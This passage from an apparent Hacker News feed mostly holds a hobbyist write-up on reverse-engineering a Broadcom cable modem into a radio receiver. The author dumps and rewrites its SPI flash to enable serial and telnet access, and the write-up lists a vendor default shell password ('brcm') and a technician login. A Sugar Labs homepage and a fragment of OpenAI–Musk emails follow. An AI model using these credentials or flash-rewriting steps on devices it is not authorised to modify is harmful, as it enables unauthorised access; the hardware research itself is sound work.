be used to bypass the check, but a much greater understanding of the OS and
memory layout would be required.</p>

<h2 id="dumping-the-flash">Dumping the flash</h2>

<p>My goal now was to enable the serial console. Examination of the board reveals
a single <a href="https://en.wikipedia.org/wiki/Serial_Peripheral_Interface">SPI</a> flash
chip which likely contains the bootloader, OS, and configuration as it is the
only non-volatile storage visible on the board.</p>

<p>This is where the Raspberry Pi comes in handy once again. The GPIO header also
conveniently contains a SPI interface which can be used to read the data off
of the flash chip.</p>

<p>Searching the number on the chip, “winbond 25Q32JV”, yields the datasheet
containing the pinout. The important ones are VCC, Chip Select (CS), Clock
(CLK), Data Out (DO), Data In (DI), and ground.</p>

<p>One common issue with dumping a SPI chip on a board is that the chip requires
power, but this will also usually power the board and cause it to start booting
and using the chip. I chose to overcome this by heating the VCC pin with my
soldering iron and very carefully lifting it off the pad. This is a convenient,
but rather crude solution which may result in snapped off leads so use at your
own risk! I also soldered a jumper wire to the pad and another to the floating
leg so that I could easily connect and disconnect them and allow the device to
boot again.</p>

<p>Another note, on some boards the Chip Select pin is assumed to always be 
enabled so it is directly tied to VCC. This means when you power the CS 
pin, the board also starts booting. This can be solved in a similar way
to the VCC pin.</p>

<p>Now, wires can be soldered to the rest of the pins and the they can be
connected to the Raspberry Pi. The ground goes to ground (the UART ground
from earlier can also be used), the VCC to the Pi’s 3.3v pin. (Again, it is
critical to verify with the datasheet that this is a 3.3v chip because the Pi
only supports 3.3v). The DO pin is connected to the Pi’s SPI <code>MISO</code> (master in 
slave out) pin and DI to the <code>MOSI</code> pin (master out slave in). Lastly, the 
Clock is connected to the <code>SCLK</code> GPIO pin and the Chip Select to the <code>CE0</code> pin.</p>

<table>
  <thead>
    <tr>
      <th><img src="https://stdw.github.io/cm-sdr/img/chip.jpg" alt="flash chip"></th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td><em>Not the best soldering job but it will work</em></td>
    </tr>
  </tbody>
</table>

<p>To actually read the chip, there is a fantastic tool called 
<a href="https://flashrom.org/Flashrom">flashrom</a> which supports an enormous number of
chips. <code>flashrom</code> is present in the repos of many distributions including that
of the Raspberry Pi OS (formerly known as Raspbian).</p>

<p>Luckily the W25Q32JV is supported, under the name “W25Q32.V”. A quick check on
the flashrom wiki shows the size and voltage match what is expected and that
the chip is fully supported.</p>

<p>Before proceeding, ensure that the SPI interface on the Pi is enabled by
using the <code>raspi-config</code> utility and checking under “Interfacing Options”.</p>

<p>At last we can read the chip. First verify that it is detected and everything is
wired correctly:</p>
<div><pre><code>flashrom -p linux_spi:dev=/dev/spidev0.0,spispeed=2000 \
    --chip W25Q32.V
</code></pre></div>

<p>If that succeeds we can now dump the contents:</p>
<div><pre><code>flashrom -p linux_spi:dev=/dev/spidev0.0,spispeed=2000 \
    --chip W25Q32.V \
    --read modem.bin
</code></pre></div>

<h2 id="firmware-analysis">Firmware Analysis</h2>

<p>A quick glance at the hexdump reveals that most of the data is compressed or
encrypted but near the end, the configuration is visible.</p>

<div><pre><code>...
003f00c0: ffff ffff ffff ffff ffff 0000 07b0 369a  ..............6.
003f00d0: 6336 0010 434d 4170 0002 0000 0002 0000  c6..CMAp........
003f00e0: 0000 0057 4d4c 6f67 0005 0004 7573 6572  ...WMLog....user
003f00f0: 0004 7573 6572 0005 6164 6d69 6e00 086d  ..user..admin..m
003f0100: 6f74 6f72 6f6c 6102 7465 6368 6e69 6369  otorola.technici
...
</code></pre></div>

<p>The web interface credentials are plainly visible as well as many other
encoded configuration values.</p>

<p>After some searching, I came across a great project called 
<a href="https://github.com/jclehner/bcm2-utils">bcm2-utils</a> which contains utilities
to dump, parse, and modify the configuration on Broadcom cable modems. The repo
also contains a lot of very detailed documentation on the format of the
firmware and configuration. As a quick note, the dumping feature requires 
either telnet or serial connection, neither of which were available on my device.</p>

<p>The start of the configuration is actually at 0x003f0000 on my device and
includes the 202 0xff bytes. After extracting just the config from the dump,
I was able to successfully read it with <code>bcm2cfg</code>.</p>

<p>I enabled the serial console as well as telnet access and set a simpler telnet
password.</p>

<div><pre><code>$ ./bcm2-utils/bcm2cfg set bfc.serial_console_mode "rw"
bfc.serial_console_mode = rw
$ ./bcm2-utils/bcm2cfg set userif.remote_acc_methods 0x3
userif.remote_acc_methods = http | telnet
$ ./bcm2-utils/bcm2cfg set userif.remote_acc_pass abcd
userif.remote_acc_pass = abcd
</code></pre></div>

<p>Next, I appended the modified configuration onto a file padded with zeros up
to the appropriate offset and used <code>flashrom</code> to write the configuration back
to the chip.</p>

<p>To avoid rewriting the entire chip, I created a layout file for <code>flashrom</code> so it
would only overwrite the configuration rather than the entire contents which is
why the modified image is just padded with zeros.
The layout file looks like this:</p>
<div><pre><code>00000000:003effff fw
003f0000:003fffff cfg
</code></pre></div>
<p>and the command:</p>
<div><pre><code>flashrom -p linux_spi:dev=/dev/spidev0.0,spispeed=2000 \
    --chip W25Q32.V \
    --layout ./layout \
    --image cfg \
    --write modem-modified.bin
</code></pre></div>

<p>After opening the serial console and booting again, I am greeted with… the 
exact same thing as before.</p>

<p>Closer examination of the flash image shows that there are a number of
repeated copies of the configuration following the initial one. These have
slight differences, the most obvious being additional error log messages. It 
appears that the device keeps rolling backups of the configuration in case 
one gets corrupted.</p>

<p>To simplify things, I did a factory reset through the web interface to get rid
of all the error log messages. Then I dumped the flash again and repeated the 
previous process to modify the clean configuration except this time I truncated
the config to only include the first copy. Then using some <code>dd</code> commands I
would rather not think about, I reconstructed the entire configuration section,
appending the modified config at each offset where a copy of the config
started.</p>

<p>After flashing this new image and booting once again, I am finally able to
view the entire boot log and then have access to a console, although the
output is being flooded by a process looking for a signal.</p>
<div><pre><code>...

Reading Permanent settings from non-vol...
Checksum for permanent settings:  0xe9d88f65
Setting downstream calibration signature to '5.7.1mp1|die temperature:70.775degC^@^@^@^@^@'
Settings were read and verified.


Reading Dynamic settings from non-vol...
Checksum for dynamic settings:  0x2630e508
Settings were read and verified.

[00:00:00 01/01/1970] [tStartup] BcmBfcFpmDriver::Init:  (BFC FPM Driver) Setting FPM Buffer size to: 256 Base Address: 0x87566600
[00:00:00 01/01/1970] [tStartup] BcmBfcFpmDriver::Init:  (BFC FPM Driver) fFpmLargestBufferSize: 2048 fFpmSizeShiftBits: 0x8
[00:00:00 01/01/1970] [tStartup] BcmBfcFpmDriver::Init:  (BFC FPM Driver) Pool index: 0  pool size: 2048
[00:00:00 01/01/1970] [tStartup] BcmBfcFpmDriver::Init:  (BFC FPM Driver) Pool index: 1  pool size: 1024
[00:00:00 01/01/1970] [tStartup] BcmBfcFpmDriver::Init:  (BFC FPM Driver) Pool index: 2  pool size: 512
[00:00:00 01/01/1970] [tStartup] BcmBfcFpmDriver::Init:  (BFC FPM Driver) Pool index: 3  pool size: 256
[00:00:00 01/01/1970] [tStartup] BcmBfcFpmDriver::Init:  (BFC FPM Driver) Lookup table index: 0  pool size: 3

...

[00:00:18 01/01/1970] [Scan Downstream Thread] BcmGenericCmDownstreamScanThread::ThreadMain:  (Scan Downstream Thread) Scanning for a Downstream Channel...
[00:00:18 01/01/1970] [Scan Downstream Thread] BcmGenericCmDownstreamScanThread::ScanStarting:  (Scan Downstream Thread) Scanning STD &amp; HRC Annex B channel plan frequencies
Resetting EnergyDetected to false.
Forgetting energy frequency.
Executing fast scan algorithm...

Type 'help' or '?' for a list of commands...

CM&gt; Scanned 489000000 Hz...
Scanned 495000000 Hz...
Scanned 501000000 Hz...
Scanned 507000000 Hz...
Scanned 513000000 Hz...
</code></pre></div>

<h2 id="ecos-console">eCos Console</h2>
<p>The eCos console contains many configuration and debugging commands. The
process flodding the output can be stopped with the following commands:</p>


<p>As a side note, these “directories” are not a real filesystem, they are just a
way of organizing groups of commands.</p>

<p>Telnet access also works at the IP address <code>192.168.100.1</code>. The username is
“technician” and the password is what I changed it to earlier when modifying
the configuration. Telnet puts you into a limited version of the shell, but
the full shell can be accessed with the <code>su</code> command and the password <code>brcm</code>
when prompted (credit to jclehner, author of bcm2-utils for that one). This
password may vary depending on the device manufacturer.</p>

<p>Initially, I just wanted to see if I could enable the web-based spectrum
analyzer which seems to be disabled on this device. There were some settings
related to it, but nothing about enabling or disabling the external interface.</p>

<p>After spending several hours poking around in the various menus and commands
I decided it was time to move on to analyzing OS.</p>

<h2 id="reverse-engineering-the-firmware">Reverse engineering the firmware</h2>
<p>Thanks to the boot log, we know the OS is located at 0x20000 and is LZMA
compressed.</p>

<p>The README of <code>bcm2-utils</code> pointed me to a 
<a href="https://github.com/Broadcom/aeolus/tree/master/ProgramStore">Broadcom repo</a> 
containing a utility called <code>ProgramStore</code> for extracting the OS image.</p>

<p>After building <code>ProgramStore</code> I was able to extract the decompressed image with
the following command:</p>
<div><pre><code>./ProgramStore -f ./ecram_sto.bin -o decompressed_fw.bin -c 4 -x
</code></pre></div>

<p>Now we can throw it into <a href="https://ghidra-sre.org/">Ghidra</a> using the base 
address from the boot log, 0x80004000 and setting the architecture to 
big endian MIPS.</p>

<p>After running the auto analysis it’s time to start digging around. Fortunately,
there a lot of debug strings that makes some functions very easy to identify.</p>

<p>I started naming any functions I came across using the strings as well as
the function signature in combination with the context it is used and any
cross references. Eventually, when ending up in an unknown function, the cross
references to named functions give some clue as to the context of the function
eventually making things a little easier.</p>

<p>For the most part, I was just searching interesting strings such as “tuner” and
“ADC” and trying to understand as much as I could, going wherever the various
function calls took me and keeping notes on interesting functions, structures, 
addresses, and theories for how things worked in a separate text document.</p>

<p>One useful feature of the eCos console is the <code>call</code> command which allows you
to call a function at an arbitrary address with the the given arguments. This
allows us to actually execute a function to test a hypothesis about what it
does.</p>

<p>The operating system has a large amount of Broadcom code on top of it which is 
all written in C++. This makes reversing it significantly more annoying by
adding a lot of indirection when it comes to function calls and polymorphism.
For example you will often see code like this:</p>
<div><pre><code>case 0x24:
    uVar23 = (**(code **)(*piParm1_00 + 0x1c))(piParm1_00);
</code></pre></div>
<p>Not only does this make the code very hard to follow, it also means Ghidra 
cannot track cross references to functions that are called in this way.</p>

<p>Sometimes the class can be determined by following the object pointer all the
way back to where it is initialized, but other times it is easier to just patch
a function where the unknown object is used to write the vale of the pointer 
to a known location and then return. This can be done with the <code>write_memory</code> 
command in the eCos console. Then the <code>call</code> command can be used to call the 
function containing the unknown object and then <code>read_memory</code> can be used to 
retrieve the pointer from the known location. These type of hacks as well as
combining static and dynamic analysis are crucial to avoid getting stuck.</p>

<p>Some functions would cause the device to crash when I tried to call them.
Closer inspection shows they are taking more than 4 arguments and using the
t0, t1, t2, and t3 registers for the additional arguments. This is a little
unusual for a 32-bit MIPS device, but as it turns out the calling convention
is determined by the ABI and MIPS has a number of different ABIs. It is
suprisingly hard to find information about the exact calling conventions, but
using <a href="https://godbolt.org/">Godbolt</a>, I was able to determine that EABI is
the most likely candidate which uses t0-t3 for additional arguments.
Unfortunately, Ghidra does not seem to support MIPS EABI, but manually setting
the argument registers on a few functions is not too inconvenient and the
arguments seem to be the only consequential difference.</p>

<p>After digging around for a while, I set my sights on the spectrum analyzer. I
was never able to figure out how to enable the web interface, although the
code for it was there.</p>

<p>I found many other useful functions such as those used to set the frequency
of a downstream (recieving) channel, the socket/bind/listen/send/recv
functions, thread creation functions, and functions for reading and writing
to registers of tuner and LNA (low noise amplifier).</p>

<h2 id="breakthrough">Breakthrough</h2>
<p>Eventually I found a console command to perform a bandpower measurement for a
given frequency range.</p>

<p>I began closely following the execution to see what it does
with the frequency range arguments and found that it calls a very
familiar function - almost identical to the one used to tune downstream
channels, but the memory mapped register addresses where the frequency is set
are just above those used for normal channels. This suggests that the spectrum
analyzer uses an extra channel that otherwise operates in a very similar way
to the normal downstream channels with regards to tuning and setting the gain.</p>

<p>Continuing on, the measurement function writes the physical address of a
destination buffer to a memory mapped register and then sets a bit in another 
register and loops until it is unset again. Then it calls the function that 
presumably computes an FFT, passing in buffer address. After the computation, 
another function does some processing on the buffer, but leaves it otherwise 
intact.</p>

<p>After sticking a jumper wire into the coaxial connector to act as as an 
antenna, I called the bandpower function and then did a <code>read_memory</code> on the 
destination buffer.</p>

<div><pre><code>CM&gt; read_memory -n256 0x86fb3e80

86fb3e80: 00 00 06 8c  00 3f fe 48  00 00 06 41  00 20 00 3d | .....?.H...A. .=
86fb3e90: 00 00 08 56  00 20 02 11  00 00 0a b3  00 20 03 f2 | ...V. ....... ..
86fb3ea0: 00 00 0a 50  00 20 04 84  00 00 06 61  00 20 03 d7 | ...P. .....a. ..
86fb3eb0: 00 00 01 1d  00 20 02 da  00 1f fd f4  00 20 00 4d | ..... ....... .M
86fb3ec0: 00 1f fd 11  00 3f fc 20  00 1f fb 95  00 3f fa ad | .....?. .....?..
86fb3ed0: 00 1f fa 32  00 3f fd fc  00 1f fc a3  00 20 00 cb | ...2.?....... ..
86fb3ee0: 00 00 01 97  00 3f fe b5  00 00 04 0f  00 3f fb 6a | .....?.......?.j
86fb3ef0: 00 00 03 9f  00 3f fb d6  00 00 03 1d  00 3f fe 55 | .....?.......?.U
86fb3f00: 00 00 02 f8  00 3f ff a9  00 00 02 ee  00 20 01 49 | .....?....... .I
86fb3f10: 00 00 03 8f  00 20 04 87  00 00 03 94  00 20 05 09 | ..... ....... ..
86fb3f20: 00 00 01 81  00 3f ff bb  00 1f ff 14  00 3f fa 97 | .....?.......?..
86fb3f30: 00 1f fe 8d  00 3f fc 9d  00 1f ff 89  00 20 01 82 | .....?....... ..
86fb3f40: 00 00 00 be  00 20 00 09  00 00 01 8f  00 3f fa 3a | ..... .......?.:
86fb3f50: 00 00 01 78  00 3f fa 66  00 00 00 7b  00 20 01 35 | ...x.?.f...{. .5
86fb3f60: 00 1f ff 79  00 20 04 f6  00 1f fe e2  00 20 02 62 | ...y. ....... .b
86fb3f70: 00 1f fd 93  00 3f ff 4d  00 1f fa ee  00 3f fe 16 | .....?.M.....?..
</code></pre></div>

<p>My hope was that this was <a href="http://www.ni.com/tutorial/4805/en/">I/Q</a> data and 
this certainly looked promising. This was supported by the function that 
processes the data after the FFT - it checks if the 0x00200000 bit is zero on 
the first 32-bit word, and if so drops the first and last word of data. 
I hypothesized that this bit indicates if the sample is an I or a Q value, and 
if the first sample is a Q, it drops the unmatched Q from
the beginning and unmatched I from the end. For example:</p>
<div><pre><code>Case 1:                Case 2:
Q IQ IQ IQ I           IQ IQ IQ IQ

     |                      | do nothing
     v                      v

  IQ IQ IQ             IQ IQ IQ IQ
</code></pre></div>

<p>The only way to know for sure was to grab some more data and analyze it.</p>

<h2 id="hello-world">Hello World</h2>
<p>To make things easier going forward, I decided to write a program that would
run on the modem to call the tune and bandpower functions, and then open a 
listening sock and send the contents of the buffer back over a TCP connection. 
I should  also note I stopped working on the Raspberry Pi at this point so 
that I would not have to create an ARM-to-MIPS crosscompiler.</p>

<p>The basic approach to write code that can be loaded and executed on
“almost-bare metal” is as follows.</p>

<p>By adding the signatures of the external functions we wish to use to a header
file and using a linker script containing the addresses of the functions, it 
is easy to compile a program that utilizes these functions. Additionally, to 
make the program work when loaded at a predetermined memory location and 
ensure the entry point is at that address, a section map is be used. 
The linker script looks something like this:</p>
<div><pre><code>memset = 0x80522d7c;
memcpy = 0x80004f30;
malloc = 0x80596998;
printf = 0x8052b178;
socket = 0x80332fd0;
bind = 0x800ae7bc;
listen = 0x80412ed4;
accept = 0x80413118;
send = 0x80413240;
recv = 0x804134bc;
tune_aux_channel = 0x80082108;

SECTIONS
{
  . = 0x80810000;
  .start : { *(.start) }
  .text : { *(.text) }
  .data : { *(.data) }
  .rodata : { *(.rodata) }
}
</code></pre></div>

<p>It is built with the following command:</p>
<div><pre><code>mips-linux-gcc measure.c \
    -march=mips32 \
    -mabi=eabi \
    -msoft-float \
    -mno-abicalls \
    -fno-builtin 
    -nostdlib \
    -nodefaultlibs \
    -nostartfiles \
    -T ./script.ld
</code></pre></div>

<p>The MIPS CPU does not have an FPU so <code>-msoft-float</code> is used. <code>-mno-abicalls</code>
seems to be required when using <code>-mabi=eabi</code>. <code>-fno-builtin</code> prevents the
compiler from optimizing certain sections by adding calls to functions like
<code>memcpy</code> which would result in an undefined symbol. <code>-nostdlib</code> and 
<code>-nostartfiles</code> prevent the compiler from using the standard c library the 
“crt0.o” entrypoint which does some setup we do not care about.</p>

<p>Using <code>objcopy</code> we can extract just the sections we care about out of the
compiled elf.</p>
<div><pre><code>mips-linux-objcopy -O binary \
    -j .start \
    -j .text \
    -j .data \
    -j .rodata \
    a.out bin
</code></pre></div>

<p>And finally, to actually load it I wrote a Python script that uses pexpect to
telnet into the modem and write the binary to the target address using the 
<code>write_memory</code> command. The program is executed with the <code>call</code> command.</p>

<p>To see if I could pick up FM radio broadcasts, I tuned it to 100MHz and
grabbed some data.</p>

<p>Using the numpy, scipy, and matplotlib Python libraries, I was able to
interpret the data a complex valued samples, compute an FFT and plot it to
see a nice band pass filtered spectrum with distinct spikes.</p>

<table>
  <thead>
    <tr>
      <th><img src="https://stdw.github.io/cm-sdr/img/plot-full.png" alt="spectrum plot"></th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td><em>The plotted frequency spectrum</em></td>
    </tr>
  </tbody>
</table>

<p>At the time I was still not really convinced, but in retrospect this really
does demonstrate that I had successfully captured complex samples as such a
plot would not be possible with the my script were that not the case.</p>

<p>I was not going to be fully convinced until I could demodulate the signal and
listen to the FM radio broadcasts. Shifting the spectrum to center one of the 
spikes, decimating it to isolate the frequency range, and using a very simple 
demodulation technique I found online for complex-valued FM, I was able to 
clearly see the different parts of the broadcast including the (what should be)
19kHz pilot tone.</p>

<table>
  <thead>
    <tr>
      <th><img src="https://stdw.github.io/cm-sdr/img/plot-demodulated.png" alt="spectrum plot"></th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td><em>The frequency spectrum of the demodulated signal</em></td>
    </tr>
  </tbody>
</table>

<p>With some experimentation, I determined that a sample rate of 15 million samples
per second puts the pilot tone right at 19kHz. This seems consistent with the 
fact that the bandpower function measures in blocks of 7.5MHz. Although you get 
a full 15MHz since these are complex-valued samples, the usable range of the 
band pass filter is more like 7.5-8MHz with an assumed 15MHz sample rate which 
matches up.</p>

<h2 id="optimizations">Optimizations</h2>
<p>At 15 million samples per second and each sample with occupying 8 bytes, 
less than a second of data can be stored in the approximately 100MB of free 
RAM.</p>

<p>One obvious improvement would be to send the data after filling the buffer and
then capture more data. The processing time and network throughput meant that
there was about an 11 second gap between captures. This was cut down to about 5
seconds by implementing a new function that sets up the registers and initiates
the capture, eliminating the FFT calculation and other processing.</p>

<p>After some experimentation with the unknown register values in hopes of finding
one that would affect the sample rate, I found a bit that appears to limit the 
I and Q values to 14 significant bits. While they were still occupying 8 bytes 
per sample, this meant I could pack two of them into a single 32-bit word.<br>
Note: I am not sure the ADC is actually sampling 14 / 20 bits as that seems
rather high, but that is the effective size of each sample value.</p>

<p>I wrote another function to process each capture, determine if it starts
with an I or a Q value and then iterate through the buffer packing each 
I/Q pair into a single integer and writing it to the next position in the 
buffer. This alone did not improve the performance much, but by only taking 
every Nth sample, I could lower the effective sample rate, shorten the 
processing time, and reduce the number of bytes I had to send back which
greatly improved the latency.</p>

<p>Another improvement was threading. I found the functions used to create and
start new threads as well as those used for counting semaphores on the OS 
thanks to some debug messages. With these tools, I could have two or more 
buffers. Then one thread continuously captures data into the next available
buffer and then signals another thread with a semaphore that it is done 
writing. The second thread packs and downsamples the data, sends it over the 
network, and then signals that the buffer is available to be written to again.</p>

<p>With these improvements and the sample rate reduced by a factor of 32 (down to
464kHz), I could endlessly capture and send data while dropping about 12%. I
believe this is mostly due to a few milliseconds of inherent latency between
when the capture is finished and the “done” flag is set. Additionally, I do
not know if there is a way to generate an interrupt or something when it
finishes so I have to restort to sleeping in a while loop since that is how it
is done in the original function.</p>

<p>My hope is that there is some sort of clock divider register to reduce the
clock of the ADC to lower the sample rate which may reduce this latancy and
eliminate postprocessing time, but I have not yet found one.</p>

<p>Downsampling this way seems to lose a lot of the information - past about 16 
times the noise floor is a lot higher and the stereo channels of FM radio 
broadcasts are no longer discernable.</p>

<p>Although dropping some data is bad some some applications, it can stream FM 
radio fairly seamlessly, although the audio has to be slowed down slightly 
so it is not consumed faster than it is being recieved. I have also been able 
to be recieved. I have also been able to pick up the 154MHz narrowband FM radio
used by the local fire department.</p>

<p><a href="https://stdw.github.io/cm-sdr/img/sample.wav">Here is a short sample of some demodulated audio captured with the modem</a></p>

<h2 id="conclusion">Conclusion</h2>

<p>Although this project was mostly just a challenge to myself and is not intended
as a serious SDR, I am satisfied with the results and hope to continue to 
improve it.</p>

<p>This quote really resonated with me, so once again in the words of VK4HAT, “With so few firsts available in life, take those that present themselves and have a crack”</p>

<p><a href="https://github.com/stdw/cm-sdr">cm-sdr repo on GitHub</a></p>


      </section></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Sugar: An activity-focused, open-source software learning platform for children (134 pts)]]></title>
            <link>https://www.sugarlabs.org/</link>
            <guid>39611849</guid>
            <pubDate>Wed, 06 Mar 2024 03:09:12 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.sugarlabs.org/">https://www.sugarlabs.org/</a>, See on <a href="https://news.ycombinator.com/item?id=39611849">Hacker News</a></p>
<div id="readability-page-1" class="page">

    <!-- Header for screens with width > 1260px and width <= 767px -->

<!-- Header for screens with width <= 1215px -->



<!-- Loader -->


<!-- Introduction page -->
<div id="slider">
                            <h2>
                                Sugar: A collaborative, free/libre open-source software learning platform for children
                            </h2>
                            <p>
                                Sugar Labs contributes to and helps maintain the award-winning Sugar Learning Platform, 
                                which promotes collaborative learning through Sugar Activities.
                            </p>
                        </div>

<!-- About Sugar section -->
<section id="intro">
    <div>
                            <div>
                                
                                <p>Learning software for children</p>
                            </div>
                            <p>Sugar is an activity-focused, free/libre open-source software learning platform for children. 
                                Collaboration, reflection, and discovery are integrated directly into the user interface. 
                                Through Sugar's clarity of design, children and teachers have the opportunity to use 
                                computers on their own terms. Students can reshape, reinvent, and reapply both 
                                software and content into powerful learning activities. 
                                Sugar's focus on sharing, criticism, and exploration is grounded in the 
                                culture of free software (FLOSS)
                            </p>
                        </div>
    <div>
        <p>
            <h2>A glimpse of Sugar...</h2>
        </p>
    </div>
</section>

<!-- "A glimpse of Sugar" slideshow -->
<div id="glimpse-slider">
                    <div>
                        <p><img id="imgrflt" src="https://www.sugarlabs.org/assets/screenshot1.png" alt="Sugar homepage screenshot" width="100%"></p><h3>This is sugar!</h3>
                        <p>Every user is greeted with this homepage view when they open Sugar. 
                            The color of the icon in the middle can be changed.</p>
                    </div>
                    <div>
                          <p><img id="imgrflt" src="https://www.sugarlabs.org/assets/neighbourhood-screenshot.svg" alt="Sugar Neighborhood view screenshot" width="100%"></p><p><br>In the Sugar Neighborhood view, learners see their
                          friends clustered around their current Activities; from this view, they can
                          join each other’s Activities.  Sugar collaboration works "peer to
                          peer," in a classroom or under a tree; Sugar does not require the
                          Internet.</p>
                    </div>
                    <div>
                          <p><img id="imgrflt" src="https://www.sugarlabs.org/assets/screenshot2.png" alt="Maze activity screenshot" width="100%"></p><p><br>This is one of the many other fun activities present in Sugar. 
                              Check out all the other activities.</p>
                    </div>
                </div>

<!-- "Sugarizer" website redirect section -->
<div id="intro">
                <h3>Have a taste of sugar on your browser right now!</h3>
                </div>

<!-- Download section -->
<div id="call-to-action">
        <div>
                <h2>GET SUGAR</h2>
                <p><i>Easy installation along with robust builds.</i></p>
            </div>
        <div>
            <div>
                    
                    <figure>
                    <img src="https://www.sugarlabs.org/assets/soas.svg" alt="SOAS svg">
                    </figure>
                    <p>The full Sugar environment on
                    any computer at any time from a thumb drive.</p>
                    <ul>
                        <li>Sugar on a Stick requires a thumb drive with at least 2GB
                        storage and downloading ~650MB.</li>
                        <li>  (Sugar on a Stick is available for free
                        and does not permanently affect your computer.)</li>
                        <li>
                        <a href="https://wiki.sugarlabs.org/go/Sugar_on_a_Stick">
                            How to create a Sugar stick</a></li>
                        <li>
                        <a href="https://www.sugarlabs.org/booting-soas">Boot SOAS</a></li>
                    </ul>
                </div>
            <div>
                    
                    <figure>
                    <img src="https://www.sugarlabs.org/assets/computer.svg" alt="computer svg">
                    </figure>
                    <p>The full Sugar environment
                    installed on a GNU/Linux computer.</p>
                    <ul>
                        <li>Sugar is available as a desktop environment on GNU/Linux.  Up to date
                        packages are available for
                        <a href="https://github.com/sugarlabs/sugar/blob/master/docs/fedora.md">Fedora</a>,
                        <a href="https://github.com/sugarlabs/sugar/blob/master/docs/debian.md">Debian</a>,
                        <a href="https://github.com/sugarlabs/sugar/blob/master/docs/ubuntu.md">Ubuntu</a> and
                        <a href="https://wiki.sugarlabs.org/go/Downloads#Do_you_use_GNU.2FLinux.3F">
                        many other</a> distros.</li>
                    </ul>
                </div>
            
        </div>
        <div>
            <div>
                    
                    <figure>
                    <img src="https://www.sugarlabs.org/assets/Trisquel-logo.png" alt="Flatpak svg">
                    </figure>
                    <p>The full Sugar environment
                        installed on Trisquel GNU/Linux computer.</p>
                        <ul>
                            <li>Trisquel on a Sugar Toast is a live/installable iso image that can be run from
                                a CD/DVD or be used to load a USB drive with data persistence.</li>
                            <li><a href="https://wiki.sugarlabs.org/go/Trisquel_On_A_Sugar_Toast">
                            How to get Sugar on a Trisquel</a></li>
                        </ul>
                </div>
            
            <div>
                    
                    <figure>
                    <img src="https://www.sugarlabs.org/assets/flatpak.svg" alt="Flatpak svg">
                    </figure>
                    <p>
                        A selection of Sugar Activities available as
                        <a href="https://flatpak.org/">Flatpak</a>
                        applications for all desktop environments and GNU/Linux distributions.
                    </p>
                    <ul>
                        <li><a href="https://flathub.org/apps/search/sugarlabs">
                            Download on Flathub  </a></li>
                    </ul>
                </div>
        </div>
        <div>
                <h3>For more details, click the link below!</h3>
                </div>
    </div>

<!-- Activities slideshow -->
<div id="testimonial">
                <h2>ACTIVITIES</h2>
                <p>Explore few of our many other finest activities</p>
            </div>

<!-- Activites website redirect section -->
<div id="intro">
                <h3>Check out the remaining hundreds of activities!</h3>
                </div>

<!-- "Feel pumped up" section -->
<div id="call-to-action">
                        <h2>EXCITED?</h2>
                        <p><i>Want to find out more?</i></p>
                        <p>Don't wait any longer! Join our mailing list for the latest discussions. 
                            Explore our wiki to find out each and every information.</p>
                        </div>

<!-- "Integration and inquiry" section -->
<div id="intro">
                <h2>INTEGRATION AND INQUIRY</h2>
                <p>See how Sugar integrates into your classroom.</p>
                </div>

<!-- "About Us" section -->
<div id="testimonial">
                <div>
                            <h2>About Us</h2>
                            <p>At Sugar Labs, we make a collection of tools that learners use to explore, discover, create, and reflect. We are non-profit and led by volunteers. We distribute these tools freely and encourage our users to appropriate them, taking ownership and responsibility for their learning. Sugar Labs, a volunteer-driven, non-profit organization, had its origins in the One Laptop per Child project. The mission of Sugar Labs is to support the Sugar community of users and developers and establish regional, autonomous “Sugar Labs” around the world to help learners “learn how to learn” by tailoring Sugar to local languages and curricula.</p>
                        </div>
                <div>
                    <div>
                            <ul>
                                <li>
                                <div>
                                <h4>11,531,321+</h4>
                                <p><span>Activities Downloaded</span>
                                </p></div>
                                </li>
                                <li>
                                
                                </li>
                                <li>
                                <div>
                                <h4>170</h4>
                                <p><span>Translated languages of Sugar Labs</span>
                                </p></div>
                                </li>
                            </ul>
                        </div>
                    <div id="testimonial-slider2">
                                <div>
                                    <p>"I don't think I've ever seen a piece of commercial software where the next version is simpler rather than more complex."</p>
                                    <p><span>Walter Bender</span> Founder-Sugar Labs</p>
                                </div>
                                <div>
                                    <p>"A successful technology creates problems that only it can solve."</p>
                                    <p><span>Alan Kay</span></p>
                                </div>
                                <div>
                                    <p>"Fedora-Based Sugar on a Stick Is One Sweet Desktop."</p>
                                    <p><span>LinuxInsider</span></p>
                                </div>
                            </div>
                </div>
            </div>

<!-- "About us" page redirect section -->


<!-- Footer -->


<!-- Javascript files -->




<!-- Inline Javascript scripts -->


<!-- Google analytics code -->




    

</div>]]></description>
        </item>
        <item>
            <title><![CDATA[OpenAI and Elon Musk (951 pts)]]></title>
            <link>https://openai.com/blog/openai-elon-musk</link>
            <guid>39611484</guid>
            <pubDate>Wed, 06 Mar 2024 02:19:01 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://openai.com/blog/openai-elon-musk">https://openai.com/blog/openai-elon-musk</a>, See on <a href="https://news.ycombinator.com/item?id=39611484">Hacker News</a></p>
<div id="readability-page-1" class="page"><div><p> is exactly right. We may wish it otherwise, but, in my and </p><p>’s opinion, Tesla is the only path that could even hope to hold a candle to Google. Even then, the probability of being a counterweight to Google is small. It just isn't zero. </p></div><div><!----><p><span>Date:</span> January 31, 2018 at 11:54:30 PM PST</p><p><span>Subject:</span> Re: Top AI institutions today</p><div><p>Working at the cutting edge of AI is unfortunately expensive. For example,</p><p>In addition to DeepMind, Google also has Google Brain, Research, and Cloud. And TensorFlow, TPUs, and they own about a third of all research (in fact, they hold their own AI conferences).</p><p>I also strongly suspect that compute horsepower will be necessary (and possibly even sufficient) to reach AGI. If historical trends are any indication, progress in AI is primarily driven by systems - compute, data, infrastructure. The core algorithms we use today have remained largely unchanged from the ~90s. Not only that, but any algorithmic advances published in a paper somewhere can be almost immediately re-implemented and incorporated. Conversely, algorithmic advances alone are inert without the scale to also make them scary.</p><p>It seems to me that OpenAI today is burning cash and that the funding model cannot reach the scale to seriously compete with Google (an 800B company). If you can't seriously compete but continue to do research in open, you might in fact be making things worse and helping them out “for free”, because any advances are fairly easy for them to copy and immediately incorporate, at scale.</p><p>A for-profit pivot might create a more sustainable revenue stream over time and would, with the current team, likely bring in a lot of investment. However, building out a product from scratch would steal focus from AI research, it would take a long time and it's unclear if a company could “catch up” to Google scale, and the investors might exert too much pressure in the wrong directions.The most promising option I can think of, as I mentioned earlier, would be for OpenAI to attach to Tesla as its cash cow. I believe attachments to other large suspects (e.g. 